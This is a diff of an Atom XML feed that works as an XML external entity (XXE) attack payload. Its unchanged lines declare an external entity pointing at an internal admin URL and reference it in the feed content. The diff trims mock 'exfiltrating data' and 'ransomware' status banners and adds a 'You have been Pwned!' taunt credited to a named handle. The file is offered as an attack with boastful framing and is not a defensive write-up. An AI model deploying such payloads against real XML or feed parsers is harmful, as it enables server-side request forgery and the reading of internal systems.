@@ -3,46 +3,13 @@
   <!ENTITY xxe SYSTEM "http://internal-admin-access/config.aspx">
 ]>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>AdverXarial</title>
-  <subtitle>Unauthorized Access in Progress...</subtitle>
+  <title>Welcome to AdverXaries // Hope you find what you're looking for!!!</title>
   <link href="http://adverxarial.executable" rel="alternate"/>
-  <updated>2024-01-01T00:00:00Z</updated>
-  <id>urn:uuid:deadbeef-0000-4444-0000-4dv3rX4r14l</id>
-  
   <entry>
-    <title>[BREACH]</title>
-    <id>urn:uuid:payload-xxe-001</id>
-    <content type="html"><![CDATA[
-
-[*] STATUS: Payload Deployed
-[*] TARGET: internal-admin-access/config.aspx
-[*] METHOD: XML External Entity Injection
-[!] ACCESSING: &xxe;
-
-100% COMPLETE
-
->>> Connection established...
->>> Exfiltrating sensitive data...
->>> Mission accomplished.
-    ]]></content>
-    <author>
-      <name>Head Adversary Operator</name>
-      <email>byt3n33dl3@pm.me</email>
-    </author>
+    <title>You have been Pwned! with XXE</title>
+    <content type="html">
+      Accessing: Work by byt3n33dl3 and crews &xxe;
+    </content>
     <published>2024-01-01T00:00:00Z</published>
-    <updated>2024-01-01T00:13:37Z</updated>
-  </entry>
-  
-  <entry>
-    <title>[ALERT] Ransomware</title>
-    <id>urn:uuid:alert-002</id>
-    <content type="html"><![CDATA[
-[*] SECURITY BREACH NOTIFICATION
-[*] Time: 00:13:37 UTC
-[*] Vector: XXE Injection
-[!] Status: Pwned!!
-[!] Your incident response team is... probably sleeping.
-    ]]></content>
-    <published>2024-01-01T00:13:37Z</published>
   </entry>
 </feed>
